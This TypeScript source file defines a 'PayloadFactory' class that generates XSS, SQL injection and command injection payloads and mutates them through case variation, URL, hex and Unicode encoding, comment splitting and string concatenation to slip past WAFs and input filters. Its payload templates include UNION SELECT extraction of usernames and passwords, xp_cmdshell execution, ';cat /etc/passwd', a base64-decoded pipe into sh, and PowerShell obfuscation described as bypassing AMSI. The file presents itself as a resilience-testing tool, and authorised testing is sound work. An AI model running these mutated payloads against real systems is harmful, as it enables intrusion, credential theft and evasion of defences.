/**
 * PayloadFactory - Metamorphic HTTP Request Payload Generator & Mutation Engine
 * Designed for resilience testing against XSS, SQLi, and Command Injection vulnerabilities.
 */

export type PayloadCategory = "xss" | "sqli" | "cmd";

export type MutationStrategy =
  | "case_variation"
  | "url_encode"
  | "double_url_encode"
  | "hex_encode"
  | "html_entity"
  | "comment_injection"
  | "whitespace_bypass"
  | "concat_bypass"
  | "unicode_escape"
  | "mixed_metamorphic";

export interface MetamorphicPayload {
  id: string;
  category: PayloadCategory;
  name: string;
  raw: string;
  mutated: string;
  mutationStrategy: MutationStrategy;
  description: string;
  bypassMechanism: string;
  mitreTechnique: string;
  riskSeverity: "low" | "medium" | "high" | "critical";
  testVector: {
    method: "GET" | "POST";
    paramName: string;
    injectionLocation: "query" | "body" | "header" | "path";
    expectedFilterSignature?: string;
  };
}

export interface ResilienceTestResult {
  payloadId: string;
  payloadName: string;
  category: PayloadCategory;
  targetDomain: string;
  testedUrl: string;
  mutationStrategy: MutationStrategy;
  sentPayload: string;
  httpStatus: number;
  statusText: string;
  latencyMs: number;
  reflected: boolean;
  wafBlocked: boolean;
  authRequired: boolean;
  executionOutcome: "BLOCKED_BY_WAF" | "AUTH_REQUIRED_401" | "POTENTIAL_REFLECTION" | "FILTER_EVADED" | "SAFE_REJECTED" | "UNRESPONSIVE";
  analysisNotes: string;
  timestamp: string;
}

export class PayloadFactory {
  /**
   * Mutates a raw payload string using metamorphic transformation techniques
   * designed to bypass deterministic signature-based WAFs and simple input filters.
   */
  public static mutate(payload: string, strategy: MutationStrategy = "mixed_metamorphic"): string {
    if (!payload) return "";

    switch (strategy) {
      case "case_variation":
        return this.applyCaseVariation(payload);

      case "url_encode":
        return this.applyUrlEncode(payload);

      case "double_url_encode":
        return this.applyDoubleUrlEncode(payload);

      case "hex_encode":
        return this.applyHexEncode(payload);

      case "html_entity":
        return this.applyHtmlEntityEncode(payload);

      case "comment_injection":
        return this.applyCommentInjection(payload);

      case "whitespace_bypass":
        return this.applyWhitespaceBypass(payload);

      case "concat_bypass":
        return this.applyConcatBypass(payload);

      case "unicode_escape":
        return this.applyUnicodeEscape(payload);

      case "mixed_metamorphic":
      default:
        return this.applyMixedMetamorphic(payload);
    }
  }

  /**
   * Instance method wrapper for mutate
   */
  public mutate(payload: string, strategy: MutationStrategy = "mixed_metamorphic"): string {
    return PayloadFactory.mutate(payload, strategy);
  }

  /**
   * Alternating and randomized uppercase/lowercase transformation on alpha characters.
   */
  private static applyCaseVariation(raw: string): string {
    let result = "";
    for (let i = 0; i < raw.length; i++) {
      const char = raw[i];
      if (/[a-zA-Z]/.test(char)) {
        // Pseudo-random alternation based on character code and index
        const shouldUpper = (char.charCodeAt(0) + i) % 2 === 0;
        result += shouldUpper ? char.toUpperCase() : char.toLowerCase();
      } else {
        result += char;
      }
    }
    return result;
  }

  /**
   * Selective URL encoding targeting boundary punctuation and control characters.
   */
  private static applyUrlEncode(raw: string): string {
    return raw
      .split("")
      .map((ch) => {
        if (/[<>'"` ;|&()=+]/.test(ch)) {
          return `%${ch.charCodeAt(0).toString(16).padStart(2, "0").toUpperCase()}`;
        }
        return ch;
      })
      .join("");
  }

  /**
   * Double URL encoding for reverse-proxy unnesting bypass (%25xx).
   */
  private static applyDoubleUrlEncode(raw: string): string {
    return raw
      .split("")
      .map((ch) => {
        if (/[<>'"` ;|&()=+]/.test(ch)) {
          const hex = ch.charCodeAt(0).toString(16).padStart(2, "0").toUpperCase();
          return `%25${hex}`;
        }
        return ch;
      })
      .join("");
  }

  /**
   * Hex entity transformation for SQL/scripting environments.
   */
  private static applyHexEncode(raw: string): string {
    // If SQL string literal, transform to 0x... format
    if (raw.startsWith("'") && raw.endsWith("'")) {
      const inner = raw.slice(1, -1);
      const hex = Array.from(new TextEncoder().encode(inner))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
      return `0x${hex}`;
    }
    // Generic hex escape sequence
    return raw
      .split("")
      .map((ch) => `\\x${ch.charCodeAt(0).toString(16).padStart(2, "0")}`)
      .join("");
  }

  /**
   * HTML Entity encoding with random leading zeroes (&#000060; for <).
   */
  private static applyHtmlEntityEncode(raw: string): string {
    return raw
      .split("")
      .map((ch) => {
        if (/[<>'"`]/.test(ch)) {
          const code = ch.charCodeAt(0);
          return (code % 2 === 0) ? `&#x${code.toString(16)};` : `&#${code};`;
        }
        return ch;
      })
      .join("");
  }

  /**
   * Injects inline syntactic comments to break up keyword tokenization.
   * - SQL: UN/**\/ION SEL/**\/ECT or /*!50000SELECT*\/
   * - XSS: <s\/**\/cript> or event comments
   * - Shell: w''h""o\`\`a\m\i
   */
  private static applyCommentInjection(raw: string): string {
    let out = raw;

    // SQL keywords
    out = out.replace(/\bUNION\b/gi, "UN/**/ION");
    out = out.replace(/\bSELECT\b/gi, "SEL/**/ECT");
    out = out.replace(/\bWHERE\b/gi, "WHE/**/RE");
    out = out.replace(/\bFROM\b/gi, "FR/**/OM");
    out = out.replace(/\bAND\b/gi, "/**/AND/**/");
    out = out.replace(/\bOR\b/gi, "/**/OR/**/");

    // XSS tags
    out = out.replace(/<script>/gi, "<script/*!--*/>");
    out = out.replace(/alert\(/gi, "alert/*--*/(");
    out = out.replace(/onerror=/gi, "onerror/*---*/=");
    out = out.replace(/onload=/gi, "onload/*---*/=");

    // Shell commands
    out = out.replace(/\bwhoami\b/gi, "w'h'o'a'm'i");
    out = out.replace(/\bcat\b/gi, "c''a''t");
    out = out.replace(/\bid\b/gi, "i\"\"d");

    return out;
  }

  /**
   * Replaces spaces with esoteric whitespace delimiters (tabs, linefeeds, comments, IFS).
   */
  private static applyWhitespaceBypass(raw: string): string {
    if (raw.includes("SELECT") || raw.includes("OR") || raw.includes("UNION")) {
      return raw.replace(/ /g, "/**/");
    }
    if (raw.startsWith(";") || raw.startsWith("|") || raw.includes("cat ") || raw.includes("curl ")) {
      return raw.replace(/ /g, "${IFS}");
    }
    // HTML / XSS space replacement: slash separator or form feed
    return raw.replace(/ /g, "/");
  }

  /**
   * String concatenation transformations:
   * - JS: window['al'+'ert']
   * - SQL: CONCAT('a','d','min')
   * - Shell: $a='wh';$b='oami';&$a$b
   */
  private static applyConcatBypass(raw: string): string {
    let out = raw;
    out = out.replace(/alert\(1\)/gi, "window['al'+'ert'](1)");
    out = out.replace(/document\.cookie/gi, "document['coo'+'kie']");
    out = out.replace(/'admin'/gi, "CONCAT('ad','min')");
    out = out.replace(/\bwhoami\b/gi, "$(printf '%s%s' 'who' 'ami')");
    return out;
  }

  /**
   * Unicode escaping for script contexts (\u003c for <, \u0061 for a).
   */
  private static applyUnicodeEscape(raw: string): string {
    return raw
      .split("")
      .map((ch) => {
        if (/[a-zA-Z]/.test(ch)) {
          return `\\u00${ch.charCodeAt(0).toString(16).padStart(2, "0")}`;
        }
        return ch;
      })
      .join("");
  }

  /**
   * Metamorphic multi-layer compounding mutation combining multiple techniques.
   */
  private static applyMixedMetamorphic(raw: string): string {
    let transformed = raw;

    // 1. Comment fragment injection on keywords
    transformed = this.applyCommentInjection(transformed);

    // 2. Case perturbation on remaining alphanumeric tokens
    transformed = this.applyCaseVariation(transformed);

    // 3. Selective URL encoding on critical delimiters
    transformed = transformed
      .replace(/</g, "%3C")
      .replace(/>/g, "%3E")
      .replace(/ /g, "%20");

    return transformed;
  }

  /**
   * Generates metamorphic XSS payloads designed to test input sanitization resilience.
   */
  public generateMetamorphicXSS(targetParam = "q"): MetamorphicPayload[] {
    const rawTemplates = [
      {
        name: "Polymorphic SVG OnLoad Stager",
        raw: `<svg/onload=alert(1)>`,
        strategy: "case_variation" as MutationStrategy,
        description: "Inline SVG execution triggering autonomous alert callback on element DOM insertion.",
        bypassMechanism: "Mixed-case SVG tag with slash attribute separator eliminating space requirements.",
        mitreTechnique: "T1059.007 - JavaScript Execution",
        riskSeverity: "high" as const,
        location: "query" as const,
      },
      {
        name: "Mutated IMG Error Backtick Vector",
        raw: `<img src=x onerror=alert(document.domain)>`,
        strategy: "comment_injection" as MutationStrategy,
        description: "Broken image source handler leveraging backtick string interpolation.",
        bypassMechanism: "Null comment splitting on event handler attribute and backtick invocation.",
        mitreTechnique: "T1189 - Drive-by Compromise",
        riskSeverity: "high" as const,
        location: "query" as const,
      },
      {
        name: "Autofocus Input State Reflection",
        raw: `<input autofocus onfocus=alert(1)>`,
        strategy: "whitespace_bypass" as MutationStrategy,
        description: "Zero-click execution triggering immediately upon form autofocus rendering.",
        bypassMechanism: "Forward slash replacement of space tokens to bypass naive whitespace regex filters.",
        mitreTechnique: "T1059.007 - JavaScript Execution",
        riskSeverity: "medium" as const,
        location: "body" as const,
      },
      {
        name: "HTML5 Details Toggle Polyglot",
        raw: `<details open ontoggle=alert(1)>`,
        strategy: "case_variation" as MutationStrategy,
        description: "HTML5 toggle state vector triggering on auto-expanded details element.",
        bypassMechanism: "Case perturbation on untracked HTML5 tag attributes.",
        mitreTechnique: "T1059.007 - JavaScript Execution",
        riskSeverity: "medium" as const,
        location: "query" as const,
      },
      {
        name: "Double-Encoded Polyglot Breakout",
        raw: `</script><svg/onload=alert(1)>`,
        strategy: "double_url_encode" as MutationStrategy,
        description: "Context breakout terminating surrounding script blocks with double URL encoded SVG.",
        bypassMechanism: "Double percent-encoding (%253C) bypassing single-pass WAF decoding layers.",
        mitreTechnique: "T1059.007 - JavaScript Execution",
        riskSeverity: "critical" as const,
        location: "query" as const,
      },
      {
        name: "Concatenated Window Reflection",
        raw: `<script>window['al'+'ert'](document.cookie)</script>`,
        strategy: "concat_bypass" as MutationStrategy,
        description: "Dynamic string indexing bypassing strict alert keyword detectors.",
        bypassMechanism: "Bracket string literal concatenation resolving to native execution context.",
        mitreTechnique: "T1059.007 - JavaScript Execution",
        riskSeverity: "critical" as const,
        location: "body" as const,
      },
    ];

    return rawTemplates.map((t, idx) => ({
      id: `xss-meta-${Date.now()}-${idx}`,
      category: "xss",
      name: t.name,
      raw: t.raw,
      mutated: PayloadFactory.mutate(t.raw, t.strategy),
      mutationStrategy: t.strategy,
      description: t.description,
      bypassMechanism: t.bypassMechanism,
      mitreTechnique: t.mitreTechnique,
      riskSeverity: t.riskSeverity,
      testVector: {
        method: t.location === "body" ? "POST" : "GET",
        paramName: targetParam,
        injectionLocation: t.location,
        expectedFilterSignature: "script|onload|onerror|alert",
      },
    }));
  }

  /**
   * Generates metamorphic SQL Injection payloads.
   */
  public generateMetamorphicSQLi(targetParam = "id"): MetamorphicPayload[] {
    const rawTemplates = [
      {
        name: "Inline-Comment Auth Bypass Tautology",
        raw: `' OR '1'='1`,
        strategy: "comment_injection" as MutationStrategy,
        description: "Authentication gate bypass establishing tautological evaluation in SQL query WHERE clause.",
        bypassMechanism: "Comment splitting (/**/OR/**/) breaking keyword tokenizer while preserving evaluation.",
        mitreTechnique: "T1190 - Exploit Public-Facing Application",
        riskSeverity: "critical" as const,
        location: "query" as const,
      },
      {
        name: "Whitespace-less Union Extract",
        raw: `' UNION SELECT null,username,password FROM users--`,
        strategy: "whitespace_bypass" as MutationStrategy,
        description: "Multi-table schema extraction projecting credential columns onto active query response.",
        bypassMechanism: "Universal comment substitution (/**/) eliminating all space characters.",
        mitreTechnique: "T1190 - Exploit Public-Facing Application",
        riskSeverity: "critical" as const,
        location: "query" as const,
      },
      {
        name: "Hex-Encoded String Literal Comparison",
        raw: `'admin'`,
        strategy: "hex_encode" as MutationStrategy,
        description: "Bypasses keyword string matching by converting raw literals to hexadecimal notation.",
        bypassMechanism: "0x61646d696e representation recognized natively by RDBMS engines.",
        mitreTechnique: "T1027 - Obfuscated Files or Information",
        riskSeverity: "high" as const,
        location: "body" as const,
      },
      {
        name: "Blind Time-Based Delay Probe",
        raw: `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--`,
        strategy: "case_variation" as MutationStrategy,
        description: "Infers boolean database state via deterministic time delay invocation.",
        bypassMechanism: "Alternating casing on SELECT/SLEEP with sub-select nesting.",
        mitreTechnique: "T1499 - Endpoint Denial of Service",
        riskSeverity: "medium" as const,
        location: "query" as const,
      },
      {
        name: "Stacked Batch Query Execution",
        raw: `'; EXEC xp_cmdshell('whoami')--`,
        strategy: "mixed_metamorphic" as MutationStrategy,
        description: "Terminates current SQL statement and triggers underlying operating system shell execution.",
        bypassMechanism: "Semicolon statement termination paired with multi-layer URL encoding and comment masks.",
        mitreTechnique: "T1059.001 - PowerShell",
        riskSeverity: "critical" as const,
        location: "body" as const,
      },
    ];

    return rawTemplates.map((t, idx) => ({
      id: `sqli-meta-${Date.now()}-${idx}`,
      category: "sqli",
      name: t.name,
      raw: t.raw,
      mutated: PayloadFactory.mutate(t.raw, t.strategy),
      mutationStrategy: t.strategy,
      description: t.description,
      bypassMechanism: t.bypassMechanism,
      mitreTechnique: t.mitreTechnique,
      riskSeverity: t.riskSeverity,
      testVector: {
        method: t.location === "body" ? "POST" : "GET",
        paramName: targetParam,
        injectionLocation: t.location,
        expectedFilterSignature: "union|select|sleep|xp_cmdshell|1=1",
      },
    }));
  }

  /**
   * Generates metamorphic Command Injection payloads.
   */
  public generateMetamorphicCommandInjection(targetParam = "host"): MetamorphicPayload[] {
    const rawTemplates = [
      {
        name: "IFS Environment Delimiter Slicing",
        raw: `;cat /etc/passwd`,
        strategy: "whitespace_bypass" as MutationStrategy,
        description: "Reads sensitive system credentials using the internal field separator without literal spaces.",
        bypassMechanism: "${IFS} shell variable expanding to space, bypassing basic space-split filters.",
        mitreTechnique: "T1059.004 - Unix Shell",
        riskSeverity: "critical" as const,
        location: "query" as const,
      },
      {
        name: "Quoted Concatenation Command Stager",
        raw: `|whoami`,
        strategy: "comment_injection" as MutationStrategy,
        description: "Executes target user identification through piped single-quoted token assembly.",
        bypassMechanism: "w'h'o'a'm'i parsed by bash as a contiguous single executable identifier.",
        mitreTechnique: "T1059.004 - Unix Shell",
        riskSeverity: "high" as const,
        location: "query" as const,
      },
      {
        name: "Subshell Base64 Pipe Execution",
        raw: `$(echo d2hvYW1p|base64 -d|sh)`,
        strategy: "double_url_encode" as MutationStrategy,
        description: "Encodes the payload in base64 within a dynamic subshell $(...) expansion.",
        bypassMechanism: "Double percent-encoded pipe payload invisible to static string matching.",
        mitreTechnique: "T1027 - Obfuscated Files or Information",
        riskSeverity: "critical" as const,
        location: "body" as const,
      },
      {
        name: "PowerShell Backtick Obfuscation",
        raw: `;w\`h\`o\`a\`m\`i`,
        strategy: "case_variation" as MutationStrategy,
        description: "Windows PowerShell escape backtick insertion bypassing AMSI and script block logging.",
        bypassMechanism: "PowerShell discards backtick escape characters before binary execution.",
        mitreTechnique: "T1059.001 - PowerShell",
        riskSeverity: "high" as const,
        location: "query" as const,
      },
      {
        name: "Environment Path Slicing Vector",
        raw: `;$PATH:0:1bin$PATH:0:1id`,
        strategy: "concat_bypass" as MutationStrategy,
        description: "Extracts forward slashes from environment path strings to construct executable paths.",
        bypassMechanism: "Avoids hardcoded directory separators in network inspections.",
        mitreTechnique: "T1059.004 - Unix Shell",
        riskSeverity: "medium" as const,
        location: "query" as const,
      },
    ];

    return rawTemplates.map((t, idx) => ({
      id: `cmd-meta-${Date.now()}-${idx}`,
      category: "cmd",
      name: t.name,
      raw: t.raw,
      mutated: PayloadFactory.mutate(t.raw, t.strategy),
      mutationStrategy: t.strategy,
      description: t.description,
      bypassMechanism: t.bypassMechanism,
      mitreTechnique: t.mitreTechnique,
      riskSeverity: t.riskSeverity,
      testVector: {
        method: t.location === "body" ? "POST" : "GET",
        paramName: targetParam,
        injectionLocation: t.location,
        expectedFilterSignature: "whoami|etc/passwd|sh|base64|bin",
      },
    }));
  }

  /**
   * Generates a comprehensive metamorphic resilience suite across all categories.
   */
  public generateAllPayloads(targetParam = "test"): MetamorphicPayload[] {
    return [
      ...this.generateMetamorphicXSS(targetParam),
      ...this.generateMetamorphicSQLi(targetParam),
      ...this.generateMetamorphicCommandInjection(targetParam),
    ];
  }
}
